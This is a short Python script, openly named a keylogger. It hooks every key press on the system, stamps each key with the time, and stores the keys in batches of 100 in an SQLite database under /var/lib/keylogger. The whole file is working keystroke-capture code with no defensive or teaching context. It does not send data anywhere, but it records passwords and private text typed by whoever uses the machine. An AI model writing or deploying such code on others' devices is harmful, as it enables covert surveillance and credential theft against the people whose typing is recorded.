import keyboard, os
from pathlib import Path
from datetime import datetime
from database import *

PATH_TO_DB = "/var/lib/keylogger/data.db"
TABLE_NAME = 'keylogs'

# Create dir and db if not exists
Path(PATH_TO_DB).parent.mkdir(parents=True, exist_ok=True)
create_db(PATH_TO_DB, TABLE_NAME)

buffer = []
max_buffer_size = 100

def on_key_press(event):
    global buffer, count
    
    key = event.name
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    buffer.append([key, current_time])

    if len(buffer) >= max_buffer_size:
        insert_db(PATH_TO_DB, TABLE_NAME, buffer)
        buffer = []


if __name__ == "__main__":
    try:
        keyboard.on_press(on_key_press)
        keyboard.wait()
    except Exception as e:
        print(e)